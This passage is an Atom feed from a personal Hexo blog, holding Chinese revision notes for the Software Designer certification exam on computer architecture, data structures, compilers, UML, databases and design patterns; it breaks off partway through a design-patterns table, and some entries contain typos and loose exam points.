<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>oone</title>
  
  <subtitle>固执无罪，梦想无价 | Coding For Knowledge</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-05-25T13:29:56.712Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>mingming</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【软件设计师】考前整理</title>
    <link href="http://example.com/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/"/>
    <id>http://example.com/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/</id>
    <published>2024-05-11T00:28:48.080Z</published>
    <updated>2024-05-25T13:29:56.712Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：软件设计师考前刷题记录</p><p><a href="https://www.yuque.com/stimuming/gtzioh/mos9t6ey71g1nr1x">《软件设计师》</a></p></blockquote><span id="more"></span><h3 id="未分类"><a href="#未分类" class="headerlink" title="未分类"></a>未分类</h3><ol><li><p><u><strong>系统总线</strong></u>通常用来连接计算机中的各个部件（如CPU、内存和I&#x2F;O设备）；<u><strong>片内总线</strong></u>连接寄存器和运算器部件；<u><strong>外部总线</strong></u>连接接口和外设、DMA控制器和中断控制器。</p></li><li><p>程序中用到的是<u><strong>虚拟地址</strong></u>，硬件中访问的通常是<u><strong>物理地址</strong></u></p></li><li><p>中断向量提供的是<u><strong>中断服务程序的入口地址</strong></u>或<u><strong>存放中断服务程序的首地址</strong></u></p></li><li><p>补码表示的正确项：</p><ol><li>补码零的表示是唯一的</li><li>可以将减法运算转化为加法运算</li><li>符号为可以与数值位一起参加运算</li><li>与真值的对应关系不直观</li></ol></li><li><p>指令流水线的计算方式为 $T &#x3D; \max_{1 \leq i \leq n} { d_i }*n + {1 \leq i \leq n}{ d_i }$</p></li><li><p>表示层对应用层消息进行压缩、加密</p><ol><li>应用层：① 保持应用程序之间建立连接所需要的数据记录，为用户服务；② 确定进程之间通信的性质。</li><li>表示层：① 处理通信信号的表示方法，进行不同格式之间的翻译，并负责数据的加解密、数据的压缩与恢复</li><li>会话层：① 主要负责两个会话进程之间的通信，即两个会话层实体之间的信息交换和管理数的交换；② 为通信进行建立连接</li><li>传输层：端到端的连接。① 向用户提供可靠的端到端的服务，它屏蔽了下层的数据通信细节，让用用户及应用程序不需要考虑实际的通信方法；②主要功能为负责总体的数据传输和数据控制</li><li>网络层：分组传输和路由选择。① 主要负责路由、选择合适的路径和进行阻塞控制等功能；② 管理数据通信，实现端到端的数据传送服务，即将数据设法从源端经过若干个中间节点传送到目的端。</li><li>数据链路层：传送以帧为单位的信息。① 在两个主机上建立数据链路连接，向物理层传输数据信号，并对信号进行处理使之无差错并合理地传输；② 物理地址寻址、数据的成帧、流量控制、数据的检错和重发等；③ 解决的是所传输数据的准确性的问题，控制网络层与物理层之间的通信。</li><li>物理层：二进制传输。</li></ol></li><li><p>HTTPS加密HTTP消息的方式是<u>会话密钥+对称加密</u></p></li><li><p>入侵检测系统一般<u><strong>只做检测，不做防御</strong></u></p></li><li><p>软件著作权属于自然人的，该自然人死亡后，在有效期内，继承人<u><strong>只能继承特定权利</strong></u>，<u>不是所有权利</u>，比如署名权就不能继承。</p></li><li><p>磁盘调度分为<u><strong>移臂调度和旋转调度</strong></u>两类，在移臂调度的算法中，<u>先来先服务和最短寻找时间优先算法</u>可能会随时改变移动臂的运行方向</p></li><li><p>在磁盘调度管理中，通常<u><strong>先进行移臂调度，再进行旋转调度</strong></u>。在访问<u><strong>不同柱面</strong></u>的信息时，需要<u><strong>先进行移臂调度，之后进行旋转调度</strong></u>。在访问<u><strong>同一磁道</strong></u>的信息时，只需要<u><strong>进行旋转调度</strong></u>。</p></li><li><p>若磁盘的转速提高一倍，则<u><strong>旋转等待时间减半</strong></u></p></li><li><p>线性表采用链表存储结构的特点包括：</p><ol><li>所需空间大大小与表长成正比</li><li>插入和阐述操作不需要移动元素</li><li>无须事先估计存储控件大小</li><li>:warning: 不可随机访问表中的任一元素</li></ol></li><li><p>对采用面向对象方法开发的系统进行测试时，通常从不同层次进行测试。对类中定义的每个方法进行测试属于<u><strong>算法</strong></u>层</p></li><li><p>在输入条件规定的取值范围的情况下，合理的输入和不合理的输入至少都能执行一次属于<u>黑盒测试</u></p></li><li><p>白盒测试原则：</p><ol><li>在所有的逻辑判断中，取“真”和取“假”的两种情况至少都能执行一次</li><li>程序模块中的所有独立路径至少执行一次</li><li>每个循环都应在边界条件和一般条件下个执行一次</li></ol></li><li><p>管理<u><strong>键盘</strong></u>最适合采用的I&#x2F;O控制方式是<u><strong>中断方式</strong></u>。</p></li><li><p>哈夫曼树共有127个结点，对其进行哈夫曼编码，共能得到64个字符的编码（求叶子节点的个数）</p><blockquote><p>叶子结点：度为0的节点，与度为2的节点之间存在如下关系：<br>$N0-N2 &#x3D; 1$ 同时 $N0+N2&#x3D;127$</p></blockquote><blockquote><p>已知一棵度为3的树寸（一个节点的度是指其子树的数目，树的度是指该树中所有节点的度的最大值）中有5个度为1的节点，4个度为2的节点，2个度为3的节点，那么，该树中的叶子节点数目为9</p><p>本题考查数据结构的基础知识设树中的节点总数为n、分支数目为m，那么n&#x3D;5+4+2+叶子节点数，m&#x3D;5X1+4X2+2X3在树中，节点总数等于分支数目加上1，即n&#x3D;m+1,因此，叶子节点数&#x3D;5X1+4X2+2X3+1-5-4-2&#x3D;9</p></blockquote><p>$节点总数&#x3D;分支数目+1$</p><p>$分支数目&#x3D; \sum_{度({i…n})*度为i的节点个数} $</p></li><li><p>甘特图：</p><blockquote><ol><li>一种进度管理的工具</li><li>易于看出每个子任务的持续时间</li><li>易于看出目前项目的实际进度情况</li><li>不易于看出子任务之间的衔接关系</li></ol></blockquote></li><li><p>在软件系统交付给用户使用后，为了使用户界面更友好，对系统的图形输出进行改进，该行为属于<u>改善型</u>改进</p></li><li><p>在开发过程中，会引用第三方类。第三方类又会引用其他类。把所有的类封装在一个包中，就能提高开发效率，称为<u>共同重用原则</u>。</p></li><li><p>C语言中全局变量的存储空间在<u>静态数据区</u>分配。</p></li><li><p>Java语言符合的特征有采用<u>即时编译、对象在堆空间分配和自动的垃圾回收处理</u>。</p></li><li><p>确定的有限自动机和不确定的有限自动机：不确定的有限自动机是一个状态到另一个状态的方式有多种，确定的有限自动机是一个状态到另一个状态的方式只有一种。<u><strong>”不确定“是指当前状态的后继状态是不确定的</strong></u>。</p></li><li><p>脚本语言：主要采用解释方式实现</p><ol><li>脚本语言属于动态语言，其程序结构可以在运行中改变</li><li>脚本语言一般通过脚本引擎解释执行，不产生独立保存的目标程序</li><li>C语言属于静态语言，其所有成分可在编译时确定</li></ol></li><li><p>编译语言：</p><ol><li>执行效率更高</li></ol></li><li><p>标记语言：</p><ol><li>标记语言常用于描述<u><strong>格式化和链接</strong></u></li></ol></li><li><p>汇编语言：</p><ol><li>汇编语言源程序中的指令语句将被翻译成机器代码</li><li>汇编程序以汇编语言源程序为输入，以机器语言表示的目标程序为输出</li><li>汇编语言的指令语句必须具有操作码字段，可以没有操作数字段</li></ol></li><li><p>编译方式</p><ol><li>在机器上运行的目标程序完全独立于源程序</li><li>运行与源程序等价的目标程序</li></ol></li><li><p>解释方式</p><ol><li>运行时，直接执行源程序或源程序的内部形式</li><li>运行程序的控制权在解释程序</li><li>不产生独立的目标程序</li></ol></li><li><p>为了实现多级中断，保存程序现场信息最有效的方法是使用<u><strong>堆栈</strong></u></p></li><li><p>字符串的长度是指串中所含字符的个数</p></li><li><p>散列表（哈希表）及其查找特点：</p><ol><li>在散列表中进行查找时，需要与哈希桶中所有的关键字进行比较，直到找到与目标关键字相等的元素或者确定目标元素不存在于哈希桶中。</li><li>散列表的装填因子越小，发生冲突的可能性就会越小。但是哈希表填装因子过小时，会浪费大量空间，而当装填因子过大时，则会导致冲突的概率增加，影响散列表的性能。</li><li>用线性探测法解决冲突可能会产生聚集问题，即出现大量密集的冲突，使得哈希桶中的元素出现聚集。为了避免这种情况，可以采用其他的探测方法，如二次探测、双重散列等。</li><li>用链地址法解决冲突可以保证每个桶中只有一个元素时，平均查找长度为1，但是当一个同种有多个元素师，依然需要遍历链表中的所有元素才能找到目标元素，平均查找长度就会增加。</li></ol></li><li><p>信号量S的取值范围为 资源个数R、进程个数P<br>信号量S的取值范围为： $-(P-R) \sim R$<br>发生死锁的最小i值为：$R &lt;&#x3D; P*(S-1)+1$</p></li><li><p>数据库基本概念：透明</p><ol><li>分片透明是指用户或应用程序不需要知道逻辑上访问的表<u><strong>具体是怎么分块存储</strong></u>的</li><li>复制透明是指采用复制结束的分步方法，用户<u><strong>不需要知道数据是复制到哪些节点，如何复制的</strong></u></li><li>位置透明是指用户无须知道<u><strong>数据存放的物理位置</strong></u></li><li>逻辑透明即指局部数据模型透明，是指用户或应用程序<u><strong>无须知道局部场地使用的是那种数据模型</strong></u></li></ol></li><li><p>若了解问题的解空间，并以<u><strong>广度优先</strong></u>的方式搜索解空间，则采用的是<u><strong>分支限界算法</strong></u>策略；以<u><strong>深度优先</strong></u>的方式搜索解空间，则采用<u><strong>回溯算法</strong></u>设计策略。</p></li><li><p>软件变更控制是变更管理的重要内容，要有效进行变更控制，需要借助配置数据库和基线的概念。配置数据库一般包括<u><strong>开发库、受控库和产品库</strong></u>。</p></li><li><p>对于大多数通用程序设计语言，用<u>上下文无关文法</u>描述其语法即可。</p></li><li><p>对高级语言源程序进行编译或解释的过程可以分为多个阶段，解释方式包含：</p><ol><li>词法分析  输入：源程序 输出：记号流<ol><li>把源程序看做一个线性字符序列进行分析</li><li>使用有限自动机（不确定的有限自动机NFA或确定的有限自动机DFA）</li></ol></li><li>语法分析 输入：记号流 输出：语法树（分析树）<ol><li>分析程序中的句子结构是否正确</li><li>可以发现程序中所有的语法错误，编译正确的程序必然<u><strong>不包含语法错误</strong></u></li></ol></li><li>语义分析 输入：语法树<ol><li>语义分析不能发现程序中所有的语义错误，编译正确的程序<u><strong>可能包含语义错误</strong></u></li></ol></li><li>中间代码生成<ol><li><p>中间代码不依赖于具体的机器</p></li><li><p>使用中间代码可提高编译程序的可移植性</p></li><li><p>中间代码可以用树或图表示，常见的中间代码有后缀式、三地址式和树等</p></li><li><p>有利于进行与机器无关的优化处理</p></li><li><p>常用的中间代码表示有：</p><ol><li>树</li><li>后缀式</li><li>四元式</li></ol></li></ol></li><li>目标代码生成<ol><li>该阶段分配寄存器</li><li>与目标机器的体系结构相关</li></ol></li></ol></li><li><p>有限自动机是词法分析的一个工具，能正确地识别正规集</p><ol><li><p>确定的有限自动机（DFA）：对每一个状态来说识别字符后<u><strong>只有一个转移状态</strong></u></p></li><li><p>不确定的有限自动机（NFA）：对每一个状态来说识别字符后有<u><strong>一个以上的转移状态</strong></u></p></li></ol></li><li><p>中缀式：a+b ，后缀式（逆波兰式）：ab+，后缀式利用栈进行求值</p></li><li><p>自顶向下的语法分析方法：递归下降分析法、预测分析法</p></li><li><p>自底向上的语法分析方法：移进-归约分析法、LR分析法</p></li><li><p>大多数程序设计语言的语法规则用<u><strong>上下文无关法</strong></u>描述</p></li><li><p>进程调度分为可剥夺式和不可剥夺式两种</p></li><li><p>数据库各阶段任务：</p><ol><li>需求分析阶段：了解现行系统的概况，确定新系统功能，确定系统边界、收集支持系统目标的基础数据及其处理方法</li><li>逻辑设计阶段：对关系模式进一步的规范化处理。部分关系模式的处理、分解、合并或增加冗余属性，提高存储效率和处理效率</li></ol></li><li><p>程序的三种基本控制结构是<u>顺序、选择和重复</u>。</p></li><li><p>编写汇编语言程序时，下列寄存器中程序员访问的是<u>程序计数器（PC）</u>。</p></li><li><p>若一个程序语言可以提供链表的定义和运算，则其运行时的<u>数据空间必须采用堆策略分配存储</u>。</p></li><li><p><u>索引节点块、目录块或空闲块，特别是系统目录文件</u>在写回磁盘时发生崩溃，则对系统的影响较大。</p></li><li><p>表达式采用逆波兰式表示时，利用<u>栈</u>进行求值</p></li><li><p>设计操作系统时不需要考虑的问题是<u>语言编译器的设计实现</u></p></li><li><p>通过元素在存储空间中的相对位置来表示数据元素之间的逻辑关系，是<u>顺序存储</u>的特点</p></li><li><p>哈希表和二叉排序树都可以动态创建，属于动态查找表</p></li><li><p>顺序查找方法既适用于顺序存储结构，也适用于链表结构</p></li><li><p>使用<u><strong>队列</strong></u>对图进行<u>广度优先遍历</u></p></li><li><p>连通无向图的最小生成树种，顶点数恰好比边数多1</p></li><li><p>完全图适合采用<u>邻接矩阵存储</u></p></li><li><p>Huffman（哈夫曼）树：</p><ol><li>权值越大的叶子离根结点越近</li><li>Huffman（哈夫曼）树中不存在只有一个子树的结点</li><li>Huffman（哈夫曼）树中的结点总数一定为计数</li></ol></li><li><p>I&#x2F;O软件隐藏了I&#x2F;O操作实现的细节，方便用户使用I&#x2F;O设备</p></li><li><p>管道-过滤器体系结构：一种面向数据流的软件体系结构，主要用于实现复杂的<u><strong>数据多步转换处理</strong></u></p><ol><li>软件构件具有良好的<u><strong>高内聚、低耦合</strong></u>的特点</li><li>允许软件设计者将整个系统的输入输出行为看成是<u><strong>多个过滤器的行为的简单合成</strong></u></li><li>支持软件<u><strong>复用&#x2F;重用</strong></u></li><li><u><strong>系统维护和增强系统性能</strong></u>简单</li><li>支持对一些如<u><strong>吞吐量、死锁等属性的分析</strong></u></li><li>支持<u><strong>并行执行</strong></u></li><li>更<u><strong>容易扩展</strong></u>，可以通过添加新的过滤器来添加新的功能</li><li><u><strong>灵活性和可配置型</strong></u>，重新组合过滤器改变系统行为</li></ol></li><li><p><u><strong>PHP</strong></u> 更适合用来进行<u><strong>动态网页处理</strong></u></p></li><li><p>Huffman（哈夫曼）编码属于<u><strong>熵编码</strong></u></p></li><li><p>KMP算法Next数组</p><img src="/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/image-20240517115553251.png" class="" title="image-20240517115553251"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a  b  a  a  b  a  c  a</span><br><span class="line">0  1  1  2  2  3  4  1</span><br><span class="line"></span><br><span class="line">a a a b a a a</span><br><span class="line">0 1 2 3 1 2 3</span><br></pre></td></tr></table></figure></li><li><p>在划分模块时，一个模块的作用范围应该在其控制范围之内。若发现其作用范围不在其控制范围内，则适当的处理方法有：</p><ol><li>将判定所在模块合并到父模块中，使判定处于较高层次</li><li>将受判定影响的模块下移到控制范围内</li><li>将判定上移到层次较高的位置</li></ol></li><li><p>嵌入式系统初始化过程主要有3个环节，按照自底向上、从硬件到软件的次序依次为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">片级初始化 -&gt; 板级初始化 -&gt; 系统级初始化</span><br></pre></td></tr></table></figure><ul><li>片级初始化：完成嵌入式微处理器的初始化，包括设置嵌入式微处理器的核心寄存器和控制寄存器、嵌入式微处理器核心工作模式和嵌入式微处理器的局部总线模式等。片级初始化把嵌入式微处理器从上电时的默认状态逐步设置成系统所要求的工作状态。这是一个纯硬件的初始化过程。</li><li>板级初始化：完成嵌入式微处理器以外的其他硬件设备的初始化。另外，还需设置某些软件的数据结构和参数，为随后的系统级初始化和应用程序的运行建立硬件和软件环境。这是一个同事包含软硬件两部分在内的初始化过程。</li><li>系统级初始化：以软件初始化为主，主要进行操作系统的初始化。BSP将对嵌入式微处理器的控制权转交给嵌入式操作系统，由操作系统完成余下的初始化操作，包含加载和初始化与硬件无关的设备驱动程序，建立系统内存区，加载并初始化其他系统软件模块，如网络系统、文件系统等。最后，操作系统创还能应用程序环境，并将控制权交给应用程序的入口。</li></ul></li><li><p>流水线方式执行指令</p><ol><li>流水线方式下可同时执行多条指令</li><li>流水线方式提高了各部件的利用率</li><li>流水线方式提高了系统的吞吐率</li></ol></li><li><p>主存与Cache的地址映射方式中，<u><strong>全相联</strong></u>方式可以实现主存任意一块装入Cache中任意位置，只有装满才需要替换。</p></li><li><p>与CPU有关的信息交换都是采用同步传输，除了CPU与IO设备之间</p></li><li><p>Cache(高速缓冲存储器)</p><ol><li>Cache的内容是主存部分内容的拷贝</li><li>Cache的命中率并不随其容量增大线性地提高</li><li>Cache位于主存与CPU之间</li><li>Cache的设计思想是在合理成本下提高命中率</li></ol></li><li><p>由硬件自动完成Cache与主存之间的地址映射</p></li><li><p>PCI总线是并行内总线，SCSI总线是并行外总线</p></li><li><p>RISC与CISC</p><table><thead><tr><th></th><th>RISC</th><th>CISC</th></tr></thead><tbody><tr><td>指令种类</td><td>少、精简</td><td>多、复杂</td></tr><tr><td>指令复杂度</td><td>低（简单）</td><td>高（复杂）</td></tr><tr><td>指令长度</td><td>固定</td><td>变化</td></tr><tr><td>寻址方式</td><td>少</td><td>复杂多样</td></tr><tr><td>实现（译码）方式</td><td>硬布线控制逻辑<br />（组合逻辑控制器）</td><td>微程序控制技术</td></tr><tr><td>通用寄存器数量</td><td>多、大量</td><td>一般</td></tr><tr><td>流水线技术</td><td>支持</td><td>支持</td></tr><tr><td>执行时长</td><td>大多指令在一个时钟周期内完成</td><td></td></tr></tbody></table></li><li><p>闪存：</p><ol><li>掉电后信息不会丢失，属于非易失性存储器</li><li>以块为单位进行删除操作</li><li>在嵌入式系统中可以用 Flash 来代替 ROM存储器</li></ol></li><li><p>采用总线结构的优点：</p><ol><li>简化系统结构，便于系统设计制造</li><li>大大减少了连接数目，便于布线，减小体积，提高系统的可靠性</li><li>便于接口设计，所有总线连接的设备均采用类似的接口</li><li>便于系统的扩充、更新与灵活配置，易于实现系统的模块化</li><li>便于设备的软件设计，所有接口的软件就是对不同的口地址进行操作</li><li>便于诊断和维修，同时降低了成本</li></ol></li><li><p>总线复用方式可以<u><strong>减少总线中信号线的数量</strong></u></p></li><li><p>常用的虚拟存储器由<u><strong>主存-辅存</strong></u>两级存储器组成。</p></li><li><p>指令寄存器的位数取决于<u><strong>指令字长</strong></u></p></li><li><p>指令系统中采用不同寻址方式的目的是<u><strong>扩大寻址空间并提高编程灵活性</strong></u></p></li><li><p>若某计算机系统的I&#x2F;O接口与主存采用统一编址，则输入输出操作是通过<u><strong>访存指令</strong></u>来完成的。</p></li><li><p>CPU需要与外设进行数据交换，采用中断方式和DMA方式控制技术时，CPU与外设可并行工作</p></li><li><p>系统总线：ISA（工业标准总线）、EISA（ISA的32位）、PCI（并行内总线）、SCSI（并行外总线）</p></li><li><p>SRAM与DRAM<br>DRAM（动态随机存储器）构成主存，DRAM需要周期性的刷新保持信息<br>SRAM（静态随机存储器）构成Cache</p><table><thead><tr><th></th><th>SRAM</th><th>DRAM</th></tr></thead><tbody><tr><td>原理</td><td>触发器</td><td>电容</td></tr><tr><td>读出</td><td>非破坏性</td><td>破坏性</td></tr><tr><td>刷新</td><td>不用</td><td>用</td></tr><tr><td>送地址</td><td>一起送</td><td>行列分开送</td></tr><tr><td>速度</td><td>快</td><td>慢</td></tr><tr><td>集成度</td><td>低</td><td>高</td></tr><tr><td>功耗</td><td>高</td><td>低</td></tr><tr><td>成本</td><td>高</td><td>低</td></tr><tr><td>用途</td><td>Cache</td><td>内存</td></tr></tbody></table><p>闪存可以理解为U盘，故断电后信息不回丢失。闪存是以块为单位进行删除的。</p><p>闪存是EPROM的一种类型</p></li><li><p>数据库的安全机制中，通过提供<u><strong>存储过程</strong></u>供第三方开发人员调用进行数据更新，从而保证数据库的关系模式不被第三方所获取。</p></li><li><p>m阶B-树的特征：</p><ol><li>树中每个结点最多有M棵子树。即根节点最多有m棵子树</li><li>若根节点不是叶子及诶单，则最少有两棵子树</li><li>除根之外的所有非终端节点最少有 $m&#x2F;2$ 棵子树</li><li>所有叶子结点都在同一个层次上</li><li>节点中的关键字有序排列</li></ol></li><li><p>平衡二叉树：二叉树的任意一个结点的左右子树高度之差的绝对值不超过1</p></li><li><p>二叉排序树：左&lt;根&lt;右。中序遍历得到的序列是有序序列。</p></li><li><p>最优二叉树（哈夫曼树）：是一类带权路径长度最短的树</p></li><li><p>算法使用场景</p></li><li><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>分数背包</td><td>贪心算法</td><td></td></tr><tr><td>0-1背包</td><td>动态规划</td><td></td></tr><tr><td>旅行商</td><td>暴力搜索</td><td></td></tr><tr><td>最长公共子序列</td><td>动态规划</td><td></td></tr></tbody></table></li><li><p>VLAN tag 在 OSI 参考模型的 <u><strong>物理链路层</strong></u></p></li><li><p>结构型模式涉及如何组合类和对象以获得更大的结构，行为模式涉及算法和对象间职责的分配。</p></li><li><p>系统的可维护性指标：可理解性、可测试性和可修改性</p></li></ol><h3 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h3><ol><li>Dijkstra 算法算法设计策略是贪心算法，找最短路径</li></ol><img src="/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/image-20240524111318991.png" class="" title="image-20240524111318991"><table><thead><tr><th></th><th><a href="https://zhuanlan.zhihu.com/p/126116878">【算法】排序算法之基数排序 - 知乎</a></th><th>时间复杂度</th><th>空间复杂度</th></tr></thead><tbody><tr><td>冒泡排序</td><td>从前往后依次两两进行比较，如果符合条件则调换</td><td></td><td></td></tr><tr><td>简单选择排序</td><td>从列表中依次选择第n小的替换到对应的位置</td><td></td><td></td></tr><tr><td>折半查找</td><td><br />是一个分支算法<br />只能应用于有序表<br />若表长为n，则时间复杂度为$O(\log n)$</td><td></td><td></td></tr><tr><td>直接插入排序</td><td>排序过程中，每次从无序表中取出第一个元素，将其插入到有序表中的适当位置，使有序表的长度不断加长。</td><td>O(n)</td><td>O(1)</td></tr><tr><td>快速排序</td><td></td><td>最好：O(nlgn)<br />最坏：O(N^2^)</td><td>O(1)</td></tr><tr><td>归并排序</td><td>分组然后合并</td><td>最好与最坏情况都是O(nlgn)</td><td></td></tr></tbody></table><h3 id="UML用例图"><a href="#UML用例图" class="headerlink" title="UML用例图"></a>UML用例图</h3><table><thead><tr><th>图</th><th>作用</th></tr></thead><tbody><tr><td>用例图<br />Use Case Diagram</td><td>用例图用于描述系统外部的各类执行者与系统提供的各种用例之间的关系，展示了系统的功能需求。<br />他说明了谁要使用系统，以及他们使用该系统可以做些什么</td></tr><tr><td>类图<br />Class Diagram</td><td>类图描述系统中类的静态结构，以及各个类之间的关系。<br />它展示了类的属性、方法以及他们之间的继承、关联、聚合等关系</td></tr><tr><td>对象图<br />Object Diagram</td><td>对象图是类图的一种实例化图，描述了系统中的对个对象在某一时刻的状态。他是类图的动态实例。</td></tr><tr><td>包图<br />Package Diagram</td><td>包图对构成系统的模型元素进行分组整理，表示包与包之间的关系，描述系统的分层结构。① 可以拥有类、接口构建、节点；② 一个包可以嵌套其他包；③ 一个包类元素不能重名</td></tr><tr><td>活动图<br />Activity Diagram</td><td>活动图描述了业务实现用例的工作流程，展示了从一个活动到另一个活动的控制流</td></tr><tr><td>状态图<br />State Diagram</td><td>状态图是描述状态到状态控制流的图，常用语动态特性建模。它展示了对象在其声明周期中的不同状态以及状态之间的转换。</td></tr><tr><td>顺序图<br />Sequence Diagram</td><td>描述多个对象之间按顺序调用情况</td></tr><tr><td>协作图<br />Collaboration Diagram<br />（通信图）</td><td>描述了对象之间的协助关系，展示了对象之间的消息传递和交互</td></tr><tr><td>构件图<br />Component Diagram</td><td>一种特殊的UML图，用于描述系统的静态实现视图，展示系统中的软件和硬件组件以及他们之间的依赖关系</td></tr><tr><td>部署图<br />Deployment Diagram</td><td>部署图定义系统中软硬件的物理体系结构，展示了硬件节点、软件组件以及它们之间的部署关系。</td></tr></tbody></table><h4 id="用例图之间的关系"><a href="#用例图之间的关系" class="headerlink" title="用例图之间的关系"></a>用例图之间的关系</h4><img src="/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/ucd.png" class="" title="在这里插入图片描述"><ol><li><p>泛化关系<br>这是一种继承关系，子用例是父用例的一种特殊形式，它继承了父用例的所有结构、行为、关系。在图形表示中，三角箭头指向父用例。如上所示Email或昵称登录、手机号登录</p></li><li><p>包含关系</p><p>一个用例的行为包含了另一个用例的行为。当执行基用例是，每次都必须调用被包含用例。被包含用例也可以单独执行。</p></li><li><p>扩展关系<br>扩展用例在扩展点上增加新的维护和含义。扩展用例为基用例添加新的行为，箭头指向基用例。这种关系允许基用例的行为在特定条件下被扩展用例所添加的行为所修改或增强。</p></li></ol><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><ol><li><p>数据库的对应关系</p><table><thead><tr><th>表现</th><th>三级模式</th><th>视图</th></tr></thead><tbody><tr><td>基本表</td><td>模式</td><td><u><strong>概念</strong></u>视图</td></tr><tr><td>存储文件</td><td>内模式（只有一个）</td><td><u><strong>内部</strong></u>视图</td></tr><tr><td>视图</td><td>外模式（可以有多个）</td><td><u>用户视图</u></td></tr></tbody></table></li><li><p>两级映像</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>模式&#x2F;内模式映像</td><td>物理独立性</td></tr><tr><td>外模式&#x2F;模式映像</td><td>逻辑独立性</td></tr></tbody></table></li><li><p>数据库的三级模式</p><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>概念模式</td><td>概念模式是数据库中<u><strong>全体数据的逻辑结构</strong></u>和特征的描述，是所有用户的公共数据视图。一个数据库只有一个概念模式。</td></tr><tr><td>外模式</td><td>外模式（子模式、用户模式）用以描述<u><strong>用户看到</strong></u>或使用的哪部分数据的逻辑结构，用户根据外模式用数据操作语句或应用程序去操作数据库中的数据</td></tr><tr><td>内模式</td><td>内模式定义的是<u><strong>存储记录的类型、存储域的表示</strong></u>以及存储记录的物理顺序，<u><strong>指引元、索引和存储路径</strong></u>等数据的存储组织。一个数据库只有一个内模式</td></tr></tbody></table></li><li><p>4类故障</p><ol><li>事务内部故障。事务内部的故障有的可以通过事务程序本身发现。但有些是非预期的，不能由事务程序处理，例如<u><strong>运算溢出、并发事务发生死锁</strong></u>等</li><li>系统故障。通常称为软故障，是指造成系统停止运行的任何事件，使得系统要<u><strong>重新启动</strong></u>。</li><li>介质破坏。通常称为硬故障，如<u><strong>磁盘损坏、磁头碰撞和瞬时强磁干扰</strong></u>。此类故障发生的<u><strong>几率小</strong></u>，但<u><strong>破坏性最大</strong></u>。</li><li>计算机病毒。</li></ol></li><li><p>三大范式</p><ol><li>1NF。数据库表的每一列都是不可分割的原子项。避免数据冗余和混淆。<br> <u>例如：不能在“姓名”列中同时存储一个人的姓换和名，而应该拆分为”姓“和”名”。</u></li><li>2NF。除了主键以外，其他字段都必须依赖于主键。<br> <u>例如：在一个订单表中，订单号（主键）与订单详情、客户信息等字段都有关联。但客户信息不应该直接存储在订单表中，而应该单独建立一个客户表，并通过订单号与客户ID进行关联。</u></li><li>3NF。在满足第二范式的基础上。3NF 要求飞逐渐字段之间不存在传递依赖关系，也就是说，一个非主键字段不能依赖于另一个非主键字段。<br> <u>例如：在一个员工表中，员工号（主键）与姓名、部门号等字段都有关联。但部门号（非主键）不应该与部门名称（非主键）直接关联，而应该通过部门号与部门表进行关联。</u></li></ol></li><li><p>连接</p> <img src="/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/image-20240517112508412.png" class="" title="image-20240517112459448"> <img src="/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/image-20240517112459448.png" class="" title="image-20240517112459448"></li></ol><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><p>创建型</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>工厂方法<br />Factory Method</td><td>定义一个用于创建对象的接口，让子类决定实例化哪一个类</td></tr><tr><td>抽象工厂<br />Acstract 